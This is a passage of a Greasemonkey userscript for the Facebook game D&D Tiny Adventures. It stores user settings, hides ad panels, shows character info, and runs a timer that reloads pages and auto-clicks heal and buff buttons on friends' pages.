	tcimgbuff += "cU/8yODsfsZlwT4sN0VBkjS4mfoixZdE6Ko6yyiCMFHarr4T62mva6Gdde+9fQ5bRf7QuXZWdbYH";
	tcimgbuff += "6vK7my4ReaCuMNHe3mv5TMEJmcfHoZ6se/ZM/D/tHKsFAYy3GS999kWSGrn0uUYa7avrM2n8H2b3";
	tcimgbuff += "1at/pe1K/8n9Jl+vzlJrt24ZGr+Nk4Nd8PjdxwIjVWWsz6bhbu5YeeyV90/fB9qHov++fv1HoVg8";
	tcimgbuff += "L/P8sQD5QiF4g8FvEuPjl8k/Dicl/xFgAGj6OCJzZOeFAAAAAElFTkSuQmCC";

var tcimgbuff2 = "data:image/png;base64,";
	tcimgbuff2 += "iVBORw0KGgoAAAANSUhEUgAAACQAAAAYCAYAAACSuF9OAAAABGdBTUEAAAAAiyVgTQAABDxJREFUSIm9";
	tcimgbuff2 += "lk9vE0cYxn+7nrXjP9hEKxLsxFIl7IQAliuBJY6V6IFy4JRKPnFpPwD3fgY+Q29RxK0tQhQpB4IoPQSo";
	tcimgbuff2 += "iRBBSwIGmTgJwbFZr707O7s9FHxpVdvQ5jnOzPO8P+nVOzMaH7S8vJw9evTob41G4wspJYehaDRKLpfb";
	tcimgbuff2 += "qFQqX5qm6QJoAEtLS9NTU1NNXdcpFApEIpFDAfJ9n6dPnyKE4NSpU9FcLid1ANM0/9A0jfn5+UODARBC";
	tcimgbuff2 += "UCqV8DyPWq22CqBdu3ZtyjTNnQsXLqDr+icFK6XY2tqiUCigadrYfs/zWFlZ4cWLF0k9Eol8OzMz88kw";
	tcimgbuff2 += "r1694vbt20xOTnL9+nWazebYGdFolOPHj5NMJr/SY7HYN6ZpfhKMZVlsbm5SrVbJZDKcP3+eu3fv8vr1";
	tcimgbuff2 += "67GzTNMkHo9/rUcikTOpVGrsgCdPntBqtVhcXMQwDEzTJJPJkM/nuXfvHi9fvhwr78iRIwBF3XXdSCwW";
	tcimgbuff2 += "G8tcq9UAuHTpEpqmoZTC933i8ThCCFzX5f79+zx//nzkTMMw0DTNFGORAA8fPmR6eppyuUwYhiil6Pf7";
	tcimgbuff2 += "uK5Lv9/H932klGxvbw9AT548OTQ3EomglNLGAnrw4AEnTpygUCgQhiFSygGM67rYts379++RUtLpdFhb";
	tcimgbuff2 += "W0MphVKK06dPj1RjJCDf93n06BHlcplsNotSagDT7/eRUtLtdmk2m+zu7rK/v0+326XT6bC6uopSiiAI";
	tcimgbuff2 += "KJVKnw/U6XR49uwZ586dI5lM0m63B60JggDHcZBSsre3h2VZbGxs8PbtW1qt1mDv1q1bKKWYnZ1lcnLy";
	tcimgbuff2 += "84Asy6JcLrO1tYWmaUgpCYIAXdcRQtDr9XBdl0ajwePHj9nZ2aHb7dJut5mfnyedTqPrOm/evOHmzZtU";
	tcimgbuff2 += "q9V/fQ2GAhWLRWq1GpZlDday2Sy2bTMxMUEYhuzv72NZFtvb2/R6Pfr9PgClUmnQJsMwmJubG/o0DQVK";
	tcimgbuff2 += "p9NUKhUqlQoAd+7coV6vE4YhiUQC13Wp1+vU63W63S5KKRzHGRSenZ0ll8sNKzM60D/Jtu2/zEJg2zau";
	tcimgbuff2 += "6xIEwWCiPkdC1/UgCIKxTK1WazBlnufhed5gz3EcfN8f+9cgpUQIoYQQotPr9YhGoyObDw4OePfuHUII";
	tcimgbuff2 += "fN/H8zwcx8FxHABisRiGYRCG4ciZvV6PMAzrwvf93zudzplMJjOSMZVK4XkeBwcHg/tFSvm3Vum6juM4";
	tcimgbuff2 += "GIYxUm673UZKuSYcx/lpd3f3+3w+P5KxWCxy5coV9vb2hp6dm5vj2LFjI+U2Gg0Mw/hZ5PP5Xz+Oazwe";
	tcimgbuff2 += "H2pMp9OcPXt2pCKjqtVqMTExwdWrVzf1arUqZ2ZmfllfX/9Pi4wq3/ep1WpomvYDfPjkh2Gor6ysKMdx";
	tcimgbuff2 += "WFhYIJFIHAqMbdusr6+TSqU2Ll68uDAA+gAVuXHjxnK73V78eM/838pkMiQSiR8vX778naZpIcCf5BYm";
	tcimgbuff2 += "BSrTIgUAAAAASUVORK5CYII=";
	
var tcno = "data:image/png;base64,";	
	tcno += "iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABGdBTUEAAAAAiyVgTQAAAbxJREFU";
	tcno += "KJFN0j1rUwEUxvFf0prbN5urENwkBrFCB4da0Mng5GYmwakp0lEawQ/gByiYTaSDt4KgTg4ObkYc";
	tcno += "BAWpCEK1pKkUqqaWVLQvSdvrkKTkwIHD4flzDs85CT0xT3qIYjgxkU+l0+HB4aGd9fVKY2kpmma1";
	tcno += "q0t0i4dMpSmP5nJhstkU7+1JBIFEKqXVbDY21taiIneOoAdcCFkMcECtSfSHxWGyIfmAwi42iG4x";
	tcno += "nYDHrIySbRJ9p3SXLZgjfTGXW+yrVrP/sI1fZPvmmRqlGNNocO12B4C5sbGnA8vLl35T26Yywvkm";
	tcno += "YTIgm8I+0UwP8D6TeRRubhb2aPwgv0k5wACFZD/Z/rau1gPcP0vxsF5vfCHfcW7xGEaQTFLrazuS";
	tcno += "hdfMnqHUrNe9o1Dkk/Ym2SRSmYz+XWoxjlN4ReU05f163Sr5m7zpTj9HYTiT8TcIKuZJv2TlLfEH";
	tcno += "4q/EFaZ6j77A1Efiz5OT8XOuJOAZ10/yIo0WjRXyO23HwssUAu4Njo+Hazs70dVqdfroI54we4ry";
	tcno += "CQTo62SMw7ExP1ut6Fu1WpphK9G7RsSFNKVBikOd3j6VDaIbLHR1/wGOk52Ojr3jjAAAAABJRU5E";
	tcno += "rkJggg==";	
	
	
// ====================================================================
// ===== Variables ====================================================
// ====================================================================

// GM_setValue('tcoptions','0');

// get my facebook ID from the profile link 	
// <a href="http://www.facebook.com/profile.php?id=1131633310&amp;ref=profile">Profile</a>	


if (GM_getValue(myfbid + "tcoptions") == null) { 
 	GM_setValue(myfbid + "tcoptions","0");
} 



// set global value if none exists (default on)		

// readCookie2('tcoptiontoggle');
// 1 = flash ads
// 2 = facebook ads
// 3 = auto timer countdown
// 4 = auto click delay 

if (GM_getValue(myfbid + "removeadsflash") == null) { 
	var removeadsflash = "ON"
} else {
	var removeadsflash = GM_getValue(myfbid + "removeadsflash")
}
if (GM_getValue(myfbid + "removeadsfacebook") == null) { 
	var removeadsfacebook = "ON"
} else {
	var removeadsfacebook = GM_getValue(myfbid + "removeadsfacebook")
}
if (GM_getValue(myfbid + "frreload") == null) { 
	var frreload = 240;
} else {
	var frreload = GM_getValue(myfbid + "frreload")
}
if (GM_getValue(myfbid + "brdelay") == null) { 
	var brdelay = 3;
} else {
	var brdelay = GM_getValue(myfbid + "brdelay")
}
if (GM_getValue(myfbid + "triggerdelay") == null) { 
	var triggerdelay = 60;
} else {
	var triggerdelay = GM_getValue(myfbid + "triggerdelay")
}

if (GM_getValue(myfbid + "hbbuttons") == null) { 
	var hbbuttons = "OFF";
} else {
	var hbbuttons = GM_getValue(myfbid + "hbbuttons");
}

if (GM_getValue(myfbid + "skipcheck") == null) { 
	var skipcheck = "ON";
} else {
	var skipcheck = GM_getValue(myfbid + "skipcheck");
}

if (GM_getValue(myfbid + "tchealthcheck") == null) { 
	var tchealthcheck = "ON";
} else {
	var tchealthcheck = GM_getValue(myfbid + "tchealthcheck");
}

if (GM_getValue(myfbid + "nohealloop") == null) { 
	GM_setValue(myfbid + "nohealloop","");
} 

if (GM_getValue(myfbid + "nobuffloop") == null) { 
	GM_setValue(myfbid + "nobuffloop","");
}

if (skipcheck == "ON") { 
	getnohealbufflists();
	var checkhealme = checkhealstatus(myfbid);
	var checkbuffme = checkbuffstatus(myfbid);
} else {
	var checkhealme = "heal";
	var checkbuffme = "buff";
}


if (checkhealme == "skip") {
	var myhealval = "NO"
} else {
	var myhealval = "YES"
}

if (checkbuffme == "skip") {
	var mybuffval = "NO"
} else {
	var mybuffval = "YES"
}

if (GM_getValue(myfbid + "finishreload") == null) { 
	var finishreload = 60;
} else {
	var finishreload = GM_getValue(myfbid + "finishreload")
}



var frlooper = frreload;
var frrefresh = 0;
var bhlooper = brdelay;
var itlooper = 0;
var itblink = 0;
var chinf1 = "";	
var chinf2 = "";
var tdisp = 0;

var finishrefresh = finishreload;
 
var tchd = "";
var tcbd = "";
var c = "";
var firstdisp = 0;
var scripturl = "http://userscripts.org/scripts/show/36204"; 
var scriptinstall = "http://userscripts.org/scripts/source/36204.user.js";
var wikiurl = "http://dndta.wikia.com/wiki/";
var vermsg = "no";
var url = window.location.href;
var clocktitle = document.title;



var power1 = "<b>Cleric</b> - Lesser Healing: Heals yourself for 4 HP plus 2 HP per level (6 HP at 1st level, 8 at 2nd, etc.)<br/><b>Fighter</b> - Unstoppable: +2 Strength and Damage Reduction 2 for [level] encounters<br/><b>Paladin</b> - Sacred Circle: +3 Armor Class and +3 vs Undead for 4 encounters<br/><b>Ranger</b> - Jaws of the Wolf: +2 ATT and +2 DEX for 5 encounters<br/><b>Rogue</b> - Quick Fingers: +3 Dexterity and +3 vs. Traps for 3 encounters<br/><b>Swordmage</b> - Silversteel Veil: Take 10 on your next encounter<br/><b>Warlock</b> - Shadow Walk: +3 Charisma and +3 Constitution and +3 vs Magic for 3 encounters<br/><b>Warlord</b> - Stand Tough: +3 Strength for 4 encounters and Remove penalties<br/><b>Wizard</b> - Magic Missile: +5 attack for 3 turns"; 

var power2 = "<b>Cleric</b> - Consult Oracle: See visions of the future. (Tells you which ability the next 3 encounters will check - currently bugged, may or may not work properly.)<br/><b>Fighter</b> - Bull Rush: Gather your might and charge ahead. (Jumps to the next encounter and give a +2 bonus on that encounter.)<br/><b>Paladin</b> - Celestial Charger: Gallop past the next encounter. (Skips the next encounter.)<br/><b>Ranger</b> - Quickdraw: Restock your potions mid-adventure. (Equip two new potions during your adventure. Currently bugged, it retains the original 2 checkbox options and does not reset them to match the new potions selected. i.e. healing potion might say 'use before 7th encounter' instead of 'use when &lt; 25hp'))<br/><b>Rogue</b> - Pick Pockets: Increase gold gained for 4 encounters. Amount of Gold gained for 4 encounters doubles. (Does not count towards final score)<br/><b>Swordmage</b> - Glamor Blade: Infuse your weapon with power. Double weapon effectiveness for one encounter (doubles all stats on main hand weapon).<br/><b>Warlock</b> - Dark One's Own Luck: Raise the stakes for the next 3 encounters. Higher Risks and skill checks, but better rewards.<br/><b>Warlord</b> - Guide the Charge: Increased maximum buffs from friends. +4 max buffs. Lasts 3 encounters.<br/><b>Wizard</b> - Hallucinatory Item: Make a random (non-potion, usable) item for the adventure. Lasts until adventure is over."; 

//	GM_setValue(myfbid + 'tcchar','0');

	var chset = GM_getValue(myfbid + 'tcchar');

	if (chset == null || chset == '') {
		GM_setValue(myfbid + 'tcchar','0');
		chset = '0';
	}
	
	if (chset == '1') {
		var chdisp1 = "none"
		var pmdisp = "[+]"
	}
	if (chset == '0') {
		var chdisp1 = "inline"
		var pmdisp = "[-]"
	}

var chardivs = "<div id='char1'><table><tr><td colspan=2><table cellpadding='2' cellspacing='0' border='0' style='border: 1px solid black; background-color: #ffffcc; width: 595px;'><tr><td colspan=3 style='text-align: right; background-color: #000000;'><span style='float: left; color: #ffffff; font-size: 10px;' id='char4'>&nbsp;Character Info</span><a href='javascript:refinv();' style='color: #ffffff; font-size: 10px; display:" + chdisp1 + "' id='tc_refresh'>REFRESH</a>&nbsp;&nbsp;<a title='Contract' href='javascript:minmax();' style='color: #ffffff; font-size: 10px;' id='tc_plus_minus'>" + pmdisp + "</a>&nbsp;</td></tr><tr id='char3disp' style='display:" + chdisp1 + ";'><td><div id='char3'>loading...</div></td></tr></table></td></tr></table></div>"

var opcontent = "<table border='0' cellpadding='2' cellspacing='0' width='100%'><tr style='background-color: black; color: white;'><td colspan='2'>Friends Settings</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcautotimercountdown' href='javascript:tcoptionclick();'>Auto Timer Countdown</a></td><td id='tc_at_val'>" + frreload + " sec</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcautotrigger' href='javascript:tcoptionclick();'>Auto Trigger Delay</a></td><td id='tc_tr_val'>" + triggerdelay + " sec</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcautoclickdelay' href='javascript:tcoptionclick();'>Auto Click Delay</a></td><td id='tc_acd_val'>" + brdelay + " sec</td></tr></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcnohb' href='javascript:tcoptionclick();'>Check Heal/Buff</a></td><td id='tc_nohb_val'>" + skipcheck + "</td></tr>";

// opcontent += "<tr style='background-color: black; color: white;'><td colspan='2'>Advertising Settings</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcflashads' href='javascript:tcoptionclick();'>D&D:TA Flash Ads</a></td><td id='tc_flash_val'>" + removeadsflash + "</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcfacebookads' href='javascript:tcoptionclick();'>Facebook Ads</a></td><td id='tc_facebook_val'>" + removeadsfacebook + "</td></tr>";

opcontent += "<tr style='background-color: black; color: white;'><td colspan='2'>Advertising Settings</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcfacebookads' href='javascript:tcoptionclick();'>Facebook Ads</a></td><td id='tc_facebook_val'>" + removeadsfacebook + "</td></tr>";

opcontent += "<tr style='background-color: black; color: white;'><td colspan='2'>Health Monitor</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tchealthcheck' href='javascript:tcoptionclick();'>Health Check</a></td><td id='tc_tchealthcheck_val'>" + tchealthcheck + "</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tcfinishreload' href='javascript:tcoptionclick();'>Health Check Delay</a></td><td id='tc_tcfinishreload_val'>" + finishreload + " sec</td></tr>";

opcontent += "<tr style='background-color: black; color: white;'><td colspan='2'>My Settings</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; Heal Me</td><td id='tc_healme_val'>" + myhealval + "</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; Buff Me</td><td id='tc_healme_val'>" + mybuffval + "</td></tr><tr style='font-size: 9px;'><td>&nbsp;&#183; <a id='tchbbuttons' href='javascript:tcoptionclick();'>Show Buttons</a></td><td id='tc_hbbuttons_val'>" + hbbuttons + "</td></tr>";

opcontent += "<tr><td colspan='2' style='font-size: 9px; background-color: silver;'>Option settings will take effect when the page reloads.</td></tr></table>";

// ====================================================================
// ===== Master Program Setup ========================================= 
// ====================================================================
// call functions and start clock

checkforerror();

checkOnline(online);
checkVersionNumber(version);

checkSettings();
embedFunctions();
setUpDivs();
invload();
heroload();
checkPageOne();	

checkPageTwo();		



fillCharInfo();
setTimeout(fillCharInfo,5000) 	

setEventListeners();

setTimeout(clock,1000)

// ====================================================================
// ===== Check Settings ===============================================	
// ====================================================================

function checkSettings() {
	if (document.title.search("Chat")==-1) {		
		// remove adds setting

	//	if (removeadsfacebook == "OFF") {
	//		document.getElementById('sidebar_ads').innerHTML = '';
	//	}		
		


		if (removeadsfacebook == "OFF") {
			var facebookaddiv = document.getElementById('fadbar');
			if (facebookaddiv != null) {
				facebookaddiv.style.display= 'none';
			}
		} 


		if (removeadsfacebook == "OFF") {
			var facebookaddiv = document.getElementById('sidebar_ads');
			if (facebookaddiv != null) {
				facebookaddiv.style.display= 'none'; 
			}
		} 



	}

}



// ====================================================================
// ===== Set Listeners ================================================	
// ====================================================================

function setEventListeners() {  

	if (document.title.search("Chat")==-1) {		

		var eloptions = document.getElementById("tc_options"); 
		eloptions.addEventListener("click", optionspanel2, false); 			
	
		var elchat = document.getElementById("tc_chat_pop"); 
		elchat.addEventListener("click", popchat, false); 		
		
	//	var elop1 = document.getElementById("tcflashads"); 
	//	elop1.addEventListener("click", opflash, false); 	

		var elop1a = document.getElementById("tcautotrigger"); 
		elop1a.addEventListener("click", optrigger, false); 	
		
		var elop2 = document.getElementById("tcfacebookads"); 
		elop2.addEventListener("click", opfacebook, false); 			

		var elop3 = document.getElementById("tcautotimercountdown"); 
		elop3.addEventListener("click", opcountdown, false); 	
		
		var elop4 = document.getElementById("tcautoclickdelay"); 
		elop4.addEventListener("click", opdelay, false); 					

		var elop5 = document.getElementById("tcnohb"); 
		elop5.addEventListener("click", opnohb, false); 			

		var elop6 = document.getElementById("tchbbuttons"); 
		elop6.addEventListener("click", ophbbuttons, false); 	
	
		var elop7 = document.getElementById("tchealthcheck"); 
		elop7.addEventListener("click", optchealthcheck, false); 		
		
		var elop8 = document.getElementById("tcfinishreload"); 
		elop8.addEventListener("click", opfinishreload, false); 		
		
		var elpm = document.getElementById("tc_plus_minus"); 
		if (elpm != null) { 
			elpm.addEventListener("click", minmaxpm, false); 	
		}
	}	
		
} 

function optchealthcheck() {
	if (tchealthcheck == "ON") { 
		GM_setValue(myfbid + "tchealthcheck","OFF")
		document.getElementById("tc_tchealthcheck_val").innerHTML = "OFF" 
		tchealthcheck = "OFF"
	} else {
		GM_setValue(myfbid + "tchealthcheck","ON")
		document.getElementById("tc_tchealthcheck_val").innerHTML = "ON" 
		tchealthcheck = "ON"
	}
}

function ophbbuttons() {
	if (hbbuttons == "ON") { 
		GM_setValue(myfbid + "hbbuttons","OFF")
		document.getElementById("tc_hbbuttons_val").innerHTML = "OFF" 
		hbbuttons = "OFF"
	} else {
		GM_setValue(myfbid + "hbbuttons","ON")
		document.getElementById("tc_hbbuttons_val").innerHTML = "ON" 
		hbbuttons = "ON"
	}
}


function opnohb() {
	if (skipcheck == "ON") { 
		GM_setValue(myfbid + "skipcheck","OFF")
		document.getElementById("tc_nohb_val").innerHTML = "OFF" 
		skipcheck = "OFF"
	} else {
		GM_setValue(myfbid + "skipcheck","ON")
		document.getElementById("tc_nohb_val").innerHTML = "ON" 
		skipcheck = "ON"
	}
}


function opflash() {
	if (removeadsflash == "ON") { 
		GM_setValue(myfbid + "removeadsflash","OFF")
		document.getElementById("tc_flash_val").innerHTML = "OFF" 
		removeadsflash = "OFF"
	} else {
		GM_setValue(myfbid + "removeadsflash","ON")
		document.getElementById("tc_flash_val").innerHTML = "ON" 
		removeadsflash = "ON"
	}
}

function opfacebook() {
	if (removeadsfacebook == "ON") { 
		GM_setValue(myfbid + "removeadsfacebook","OFF")
		document.getElementById("tc_facebook_val").innerHTML = "OFF" 
        removeadsfacebook = "OFF"
	} else {
		GM_setValue(myfbid + "removeadsfacebook","ON")
		document.getElementById("tc_facebook_val").innerHTML = "ON" 
        removeadsfacebook = "ON"
	}
}

function opcountdown() {
	frreload += 120
	if (frreload > 600) { frreload = 120; } 
	GM_setValue(myfbid + "frreload",frreload)
	document.getElementById("tc_at_val").innerHTML = frreload + " sec" 
}

function opdelay() {
	brdelay += 1
	if (brdelay > 5) { brdelay = 2; } 
	GM_setValue(myfbid + "brdelay",brdelay)
	document.getElementById("tc_acd_val").innerHTML = brdelay + " sec" 
}

function optrigger() {
	triggerdelay += 10
	if (triggerdelay > 60) { triggerdelay = 10; } 
	GM_setValue(myfbid + "triggerdelay",triggerdelay)
	document.getElementById("tc_tr_val").innerHTML = triggerdelay + " sec" 
}

function opfinishreload() {
	finishreload += 15
	if (finishreload > 120) { finishreload = 30; } 
	GM_setValue(myfbid + "finishreload",finishreload)
	document.getElementById("tc_tcfinishreload_val").innerHTML = finishreload + " sec" 
}




// ====================================================================
// ===== Check Page ===================================================	
// ====================================================================

 	
function checkPageOne() {  

// http://www.facebook.com/common/error.html

	if (url.search("error.html")!=-1) {
		window.history.back()
	} 

	if (url.search("ViewTheShop.php")!=-1) {
		tdisp = 0;
        checkGeneration();	
		viewTheShop();

		
		fillEquipInfo();
		setTimeout(fillEquipInfo,5000) 	
	 		
	} 
 
  	if (url.search("ViewRewards.php")!=-1) {
		tdisp = 0;
	 	checkGeneration();	
		viewRewards();	
		addRewardPowers();	
	}	
	
 	if (url.search("ViewRetired.php")!=-1) {
		tdisp = 0;
	 	checkGeneration();	
		viewRewards();	
		addRewardPowers();	
	}	
		
	
	

}

function checkPageTwo() {  

	if (url.search("ViewNewAdventure.php")!=-1) {
		tdisp = 0;
		resetAdventureCookies();
	 	checkGeneration();		
		viewNewAdventure();
	}

	if (url.search("ViewAdventure.php")!=-1) {
		tdisp = 0;
		checkClasses();
	 	checkGeneration();		
		checkLevel();
		checkHealth();
 		viewAdventure();
		fillScore();
		setTimeout(fillScore,5000) 			
	} 

	if (url.search("ViewInventory.php")!=-1) {
		tdisp = 0;
	 	checkGeneration();	
	 	viewInventory();
	} 

 	if (url.search("index.php")!=-1) {
		tdisp = 0;
	 	checkGeneration();			
	}		

	if (url.search("ViewFriends.php")!=-1) {
		tdisp = 0;
		friendSettings();
	 	viewFriends();
		buffMonitor();
//		setTimeout(buffMonitor, 5000)
	} 
	
}

// ====================================================================
// ========= The Clock ================================================
// ====================================================================


function clock() {

 	it = document.getElementById("treasure_chest_test");  
	itblink += 1;
	itblinkdiv = "silver";
	if (itblink >= 2) {
		itblink = 0;	
		itblinkdiv = "grey";
	}

	// viewadventure specific code ------------------

	if (url.search("ViewAdventure.php")!=-1) {
	clockmsg = "";
	clockadv = "";
	chkhealth = "";
		zz = GM_getValue(myfbid + "tcadvtxt");
 		if (zz != "" && zz != null) {;
			zz = zz.replace(" / ","/");
			clockadv = zz + " - " 
		}		
		hget = GM_getValue(myfbid + "tchealth");
 		if (hget != "" && hget != null) {;
			chkhealth = hget + " - "; 
		}
		
		ccx = document.getElementById("app23415053320_eventtimediv");
		if (ccx != "" && ccx != null) { 	
			xx = ccx.innerHTML;
			xx = xx.replace("Next event in ","");	
			xx = xx.replace("<span>","");	
			xx = xx.replace("</span>","");	
			xx = xx.replace("<b>","");	
			xx = xx.replace("</b>","");	
			clockmsg = xx;	
			if (xx.search("00:01")!=-1) {	
				window.location.reload(true);
				return;	
			}
		} 
		
		

		

		if (document.title.search("Chat")==-1) {		
			if (clockmsg == "") {
				document.title = "Finished - " + chkhealth + clocktitle;
 
 				var zhget = hget.split("/");
				if (tchealthcheck == "ON" && zhget[0] != zhget[1]) {
					finishrefresh = finishrefresh - 1
					 
					if (finishrefresh <= 0) {			
						finishrefresh = finishreload;
						window.location.reload(true);
						return;
					}
				}

			} else {
				document.title = clockmsg + " - " + clockadv + chkhealth + clocktitle;
			}
		}			
			
	} 

	
	// viewfriends specific code ------------------

	if (url.search("ViewFriends.php")!=-1) {

	tch2 = GM_getValue(myfbid + "tcahtoggle");	
	tcb2 = GM_getValue(myfbid + "tcabtoggle");	
	if (tch2 == 1 || tcb2 == 1) { 
	
		frlooper = frlooper - 1;	
	 	var autimer = document.getElementById("treasure_chest_auto_timer");  
		autimer.innerHTML = "Auto Timer: " + frlooper

		if (document.title.search("Chat")==-1) {	
			xhealtot = GM_getValue(myfbid + "tchealtot")
			xbufftot = GM_getValue(myfbid + "tcbufftot")	
			document.title = frlooper + " - " + xbufftot + " - " +  xhealtot +  " - " + clocktitle;
		}		

		// reload friends at reload time
		if (frlooper <= 0) {
			frlooper = frreload;	
			window.location.reload(true);
			return;	
		}
		
	} else {
	
		var autimer = document.getElementById("treasure_chest_auto_timer");  
		autimer.innerHTML = "Auto Timer: Off"

		if (document.title.search("Chat")==-1) {	
			document.title = "Auto Timer: Off - " + clocktitle;
		}		

	}	

	// buff/heal looper 

		bhlooper = bhlooper - 1
		if (bhlooper <= 0) {
			bhlooper = brdelay;	
			bufftestx = GM_getValue(myfbid + "tcbufftest")
			healtestx = GM_getValue(myfbid + "tchealtest")
			if (bufftestx != "" && bufftestx != null) {
				buffClicker();
				itblinkdiv = "red";
			} else {
 			 	buffclear();
				if (healtestx != "" && healtestx != null) {
					healClicker();
					itblinkdiv = "green";
				} else {
	  	 			healclear();
				}
			}
			 
		}
		
		
	}
	
	// All Pages --------------------------

	
	it.style.backgroundColor = itblinkdiv;		
	serverColor();
	
 
	
	
	// Create Clock Loop --------------------
	
	setTimeout(clock, 1000)

}


// ====================================================================
// ====== View Friends ================================================
// ====================================================================

function viewFriends() {  

// add event listeners for toggling the checkboxes and use setValue instead of cookies
var elba = document.getElementById("auto_heal"); 
elba.addEventListener("click", tcahtoggle2, false); 	

var elbb = document.getElementById("auto_buff"); 
elbb.addEventListener("click", tcabtoggle2, false); 	

var elbc = document.getElementById("tc_heal_tot"); 
elbc.addEventListener("click", healtotclear2, false); 	

var elbd = document.getElementById("tc_buff_tot"); 
elbd.addEventListener("click", bufftotclear2, false); 	

	var tcht = document.getElementById("tc_heal_tot");	
	if (tcht.innerHTML == 0) {
		htot = 0;
		GM_setValue(myfbid + "tchealtot",htot)
	}

	var tcbt = document.getElementById("tc_buff_tot");	
	if (tcbt.innerHTML == 0) {
		btot = 0;
		GM_setValue(myfbid + "tcbufftot",btot)
	}	

}

// ---------------------

function healtotclear2() {
	GM_setValue(myfbid + "tchealtot","0")
	var hub = documentGetElementById("tc_heal_tot")
	hub.innerHTML = 0;
}
 
// ---------------------

function bufftotclear2() {
	GM_setValue(myfbid + "tcbufftot","0")
	var bub = documentGetElementById("tc_buff_tot")
	bub.innerHTML = 0;
}
 
// ---------------------

function tcahtoggle2() {
	var ah = GM_getValue(myfbid + 'tcahtoggle'); 
	if (ah == 1) { 
		GM_setValue(myfbid + 'tcahtoggle','0');
	} else { 
		GM_setValue(myfbid + 'tcahtoggle','1');
	} 
}

// ---------------------

function tcabtoggle2() {
	var ab = GM_getValue(myfbid + 'tcabtoggle');
	if (ab == 1) { 
		GM_setValue(myfbid + 'tcabtoggle','0');
	} else { 
		GM_setValue(myfbid + 'tcabtoggle','1');
	} 
}

// related functions -----------------

function buffMonitor() { 
		

	var elb = document.getElementById("treasure_chest_buff"); 
	elb.addEventListener("click", autoBuffStart, false); 		

	var elh = document.getElementById("treasure_chest_heal"); 
	elh.addEventListener("click", autoHealStart, false); 

	var tcab = GM_getValue(myfbid + 'tcabtoggle')
	if (tcab == 1) {
		var buffdelay = triggerdelay * 1000; 
		var abstart = setTimeout(singleClickBuff,buffdelay);
	}	

	var tcah = GM_getValue(myfbid + 'tcahtoggle')
	if (tcah == 1) {
		var healdelay = triggerdelay * 1000; 	
		var ahstart = setTimeout(singleClickHeal,healdelay);
	}	

}

function singleClickHeal() {
	var tchx = document.getElementById("tc_heal_msg");	
	tchx.innerHTML = "Checking"

	var cheal = document.getElementById("tc_heal_img"); 

 

	if (cheal != null) { 
		var evt = document.createEvent('MouseEvents'); 	
		evt.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null); 
		var cb = cheal; 
		var canceled = !cb.dispatchEvent(evt); 
	}
}


function singleClickBuff() {
	var tcbx = document.getElementById("tc_buff_msg");	
	tcbx.innerHTML = "Checking"

	var cbuff = document.getElementById("tc_buff_img"); 
 
	
	if (cbuff != null) { 
		var evt = document.createEvent('MouseEvents'); 	
		evt.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null); 
		var cb = cbuff; 
		var canceled = !cb.dispatchEvent(evt); 
	}
}


function healclear() {
	var tchc = document.getElementById("tc_heal_msg");	
	if (tchc.innerHTML != "Heal All") {
		tchc.innerHTML = "Heal All"
		
 
		
	}
	var tcht = document.getElementById("tc_heal_tot");	
	tcht.innerHTML = GM_getValue(myfbid + "tchealtot")
}

function buffclear() {
	var tcbc = document.getElementById("tc_buff_msg");	
	if (tcbc.innerHTML != "Buff All") {	
		tcbc.innerHTML = "Buff All"
 

	}
	var tcbt = document.getElementById("tc_buff_tot");	
	tcbt.innerHTML = GM_getValue(myfbid + "tcbufftot")
}



// ------------------------------------

function autoHealStart() {  
	var tchx = document.getElementById("tc_heal_msg");	
	tchx.innerHTML = "Checking"

	var cixh = document.getElementsByTagName('img');	
	var cixxh = cixh.length; 
	var complooph = ""; 
		for (qh=0; qh<cixxh; qh++) { 
			if (cixh[qh].src.search('GetWell.gif')!=-1) { 
				complooph += ":" + qh + ":";
		 	}
		} 
	complooph = complooph.replace(/\:\:/g,','); 
	complooph = complooph.replace(/\:/g,''); 
	chlen = complooph.length
//	complooph = complooph.slice(0,chlen-1); 
	
	GM_setValue(myfbid + "tchealtest",complooph)

 	
	
	
//	alert(complooph)
	
}


function autoBuffStart() {  
	var tcbx = document.getElementById("tc_buff_msg");	
	tcbx.innerHTML = "Checking"

	var cixb = document.getElementsByTagName('img');	
	var cixxb = cixb.length; 
	var comploopb = ""; 
		for (qb=0; qb<cixxb; qb++) { 
			if (cixb[qb].src.search('Buff.png')!=-1) { 
				comploopb += ":" + qb + ":";
		 	}
		} 
	comploopb = comploopb.replace(/\:\:/g,','); 
	comploopb = comploopb.replace(/\:/g,''); 
	cblen = comploopb.length
//	comploopb = comploopb.slice(0,cblen-1); 

	GM_setValue(myfbid + "tcbufftest",comploopb)

	 	
	
	
//	alert(comploopb)
	
	
}



// ------------------------------------

function healClicker() {

healtest = GM_getValue(myfbid + "tchealtest")

 	

if (healtest != "" && healtest != null) {
	
	var hix = document.getElementsByTagName('img');	
	var tch = document.getElementById("tc_heal_msg");	

	healloop = healtest.split(','); 
	heallen = healloop.length;

 	

		healme = healloop[heallen-1];

 

		healtest = healtest.replace(healme,":");	
		// click an image in FF -----
	   	var hevt = document.createEvent('MouseEvents'); 	
	 	hevt.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null); 
	 	var cbh = hix[healme]; 
	 	var canceled = !cbh.dispatchEvent(hevt); 
		// ------
 		healloop.pop();	
		healtest = healloop.join(",");	
 		GM_setValue(myfbid + "tchealtest",healtest)
 		tch.innerHTML = "Healing " + heallen; 

 
		
			var htotx = GM_getValue(myfbid + "tchealtot");
			htotx += 1;
			GM_setValue(myfbid + "tchealtot",htotx);
			var tcht = document.getElementById("tc_heal_tot");	
